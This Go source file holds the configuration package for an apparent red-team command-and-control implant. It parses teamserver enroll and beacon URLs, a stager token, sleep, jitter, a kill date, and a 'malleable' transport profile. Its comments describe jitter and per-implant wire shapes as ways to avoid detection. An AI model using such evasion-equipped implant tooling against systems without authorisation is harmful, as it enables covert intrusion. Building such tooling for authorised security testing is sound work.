// Package config carries the per-implant profile the reference Go implant
// runs with. In the full design the profile is embedded into the artifact at
// generation time (architecture.md Sec 5.1) -- sleep, jitter, kill date, and the
// C2 endpoint are baked in so each implant is self-contained. The reference
// implant takes them as flags/env instead, so a single binary runs against any
// teamserver and the build unit can inject them via -ldflags without edits here.
package config

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"
)

// Config is everything the reference implant needs to enroll and beacon.
type Config struct {
	// EnrollURL is the http(s) URL of the teamserver enroll endpoint
	// (/implants/enroll). The implant redeems its stager token here and
	// receives the leaf certificate plus CA chain bound to
	// (implant_id, engagement_id) (architecture.md Sec 9).
	EnrollURL string
	// BeaconURL is the http(s) URL of the mTLS beacon endpoint (the gRPC
	// Beacon.CheckIn stream). The implant opens a long-lived reverse connection
	// here after enrolling (architecture.md Sec 5/8).
	BeaconURL string
	// StagerToken is the one-use secret the operator minted for the engagement.
	StagerToken string
	// Sleep is the base interval between check-ins. Jitter is applied on top to
	// avoid periodic-check-in detection (architecture.md Sec 7).
	Sleep time.Duration
	// Jitter is the random delta added to each Sleep. Half the window either
	// side, so a 10s jitter on a 30s sleep yields 25s..35s.
	Jitter time.Duration
	// KillDate is the hard self-termination timestamp (architecture.md Sec 7).
	// Past it the implant exits and refuses to run. Enforcement is recorded-only
	// in this milestone; full enforcement arrives with M4.2.
	KillDate time.Time
	// CACertPath, optionally, is a PEM file pinning the teamserver CA the implant
	// trusts as the mTLS server identity. When empty the implant trusts the CA
	// chain returned at enroll (the dev CA shape). Letting enroll supply it keeps
	// the reference binary CA-agnostic; a real deployment pins it at build time.
	CACertPath string
	// Transport is the malleable transport profile (architecture.md Sec 7, M4.3):
	// the URI, headers, timing, and body shape the implant speaks on enroll so two
	// implants do not look the same. Defaults leave the wire shape unchanged.
	Transport TransportProfile
}

// TransportProfile is the malleable wire-shape profile applied to the enroll
// request (architecture.md Sec 7, M4.3). Each knob is optional and defaults to a
// value that keeps the request identical to the un-profiled shape.
type TransportProfile struct {
	// EnrollPath is the URI path appended to the enroll host to form the enroll
	// URL. Defaults to /implants/enroll, the teamserver's fixed enroll route. A
	// profile may set it to a malleable path a redirector rewrites (M4.4).
	EnrollPath string
	// UserAgent is the User-Agent header presented on enroll. Empty leaves the
	// HTTP client's default.
	UserAgent string
	// Headers are extra HTTP headers applied to the enroll request. Empty adds
	// none.
	Headers map[string]string
	// RequestTimeout is the per-request timeout for the enroll call. Zero means
	// the client's default (30s).
	RequestTimeout time.Duration
	// Envelope is how the enroll JSON body is shaped: "none" sends raw JSON,
	// "base64" wraps it as a single base64 string.
	Envelope string
}

// DefaultEnrollPath is the teamserver's fixed enroll route, the value a profile
// fills in when it does not override the path.
const DefaultEnrollPath = "/implants/enroll"

// DefaultRequestTimeout is the enroll timeout the reference implant used before
// the profile carried its own.
const DefaultRequestTimeout = 30 * time.Second

// ResolvedEnrollURL composes the enroll host (Config.EnrollURL with any path
// stripped) and the profile's enroll path, so a profiled implant enrolls against
// the path it was baked with rather than the teamserver's default route.
func (c Config) ResolvedEnrollURL() string {
	host := c.EnrollURL
	path := c.Transport.EnrollPath
	if path == "" {
		path = DefaultEnrollPath
	}
	// Drop the teamserver default enroll path (or any trailing path) from the
	// configured enroll URL so the profile's path replaces it cleanly.
	for _, suffix := range []string{"/implants/enroll", "/implants/enroll/"} {
		if strings.HasSuffix(host, suffix) {
			host = strings.TrimSuffix(host, suffix)
			break
		}
	}
	// Strip any other trailing path on the host so the profile path is appended
	// exactly once.
	if i := strings.Index(host, "://"); i >= 0 {
		rest := host[i+3:]
		if slash := strings.Index(rest, "/"); slash >= 0 {
			rest = rest[:slash]
		}
		host = host[:i+3] + rest
	}
	return host + path
}

// Parse builds a Config from command-line flags, falling back to the matching
// ROD_ environment variable for each. Flags win over env. Required fields that
// are still empty after both are rejected with a usage error.
func Parse(args []string) (Config, error) {
	fs := flag.NewFlagSet("rod-implant", flag.ContinueOnError)
	var c Config
	fs.StringVar(&c.EnrollURL, "enroll-url", env("ROD_ENROLL_URL", ""), "teamserver enroll endpoint (https://host:port/implants/enroll)")
	fs.StringVar(&c.BeaconURL, "beacon-url", env("ROD_BEACON_URL", ""), "teamserver mTLS beacon endpoint (https://host:port)")
	fs.StringVar(&c.StagerToken, "token", env("ROD_STAGER_TOKEN", ""), "stager token secret redeeming at enroll")
	fs.DurationVar(&c.Sleep, "sleep", envDuration("ROD_SLEEP", 30*time.Second), "beacon sleep interval")
	fs.DurationVar(&c.Jitter, "jitter", envDuration("ROD_JITTER", 10*time.Second), "beacon jitter interval")
	kill := fs.String("kill-date", env("ROD_KILL_DATE", ""), "RFC3339 kill date past which the implant exits")
	fs.StringVar(&c.CACertPath, "ca-cert", env("ROD_CA_CERT", ""), "optional PEM file pinning the teamserver CA to trust")
	// Malleable transport profile (architecture.md Sec 7, M4.3). Each knob falls
	// back to the matching ROD_* env, then to a no-op default, so a profiled bake
	// or an explicit flag changes the enroll wire shape and an un-profiled build
	// stays unchanged.
	fs.StringVar(&c.Transport.EnrollPath, "enroll-path", env("ROD_ENROLL_PATH", ""), "enroll URI path (default /implants/enroll)")
	fs.StringVar(&c.Transport.UserAgent, "user-agent", env("ROD_USER_AGENT", ""), "User-Agent header presented on enroll")
	fs.StringVar(&c.Transport.Envelope, "envelope", env("ROD_ENVELOPE", ""), "enroll body envelope: none or base64 (default none)")
	fs.DurationVar(&c.Transport.RequestTimeout, "request-timeout", envDuration("ROD_REQUEST_TIMEOUT", 0), "per-request enroll timeout (default 30s)")
	if err := fs.Parse(args); err != nil {
		return c, err
	}
	if *kill != "" {
		t, err := time.Parse(time.RFC3339, *kill)
		if err != nil {
			return c, fmt.Errorf("kill-date: %w", err)
		}
		c.KillDate = t
	}
	// Headers arrive as a JSON object string (e.g. {"X-Forwarded-For":"10.0.0.1"})
	// the same shape the baked profile emits. Empty or invalid JSON adds no header.
	c.Transport.Headers = parseHeadersEnv(env("ROD_HEADERS", ""))
	return c, c.Validate()
}

// Validate enforces the required fields. BeaconURL may be empty when the
// enroll/beacon hosts coincide; BeaconURLFor derives it from EnrollURL then.
func (c Config) Validate() error {
	var missing []string
	if c.EnrollURL == "" {
		missing = append(missing, "-enroll-url/ROD_ENROLL_URL")
	}
	if c.StagerToken == "" {
		missing = append(missing, "-token/ROD_STAGER_TOKEN")
	}
	if len(missing) > 0 {
		return fmt.Errorf("missing required config: %s", strings.Join(missing, ", "))
	}
	return nil
}

func env(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func envDuration(key string, fallback time.Duration) time.Duration {
	if v := os.Getenv(key); v != "" {
		if d, err := time.ParseDuration(v); err == nil {
			return d
		}
	}
	return fallback
}

// parseHeadersEnv decodes the ROD_HEADERS value (a JSON object string, the same
// shape the baked profile's "headers" field carries) into a header map. An empty
// or malformed value yields nil so a bad bake never breaks enroll.
func parseHeadersEnv(raw string) map[string]string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil
	}
	var headers map[string]string
	if err := json.Unmarshal([]byte(raw), &headers); err != nil {
		return nil
	}
	if len(headers) == 0 {
		return nil
	}
	return headers
}
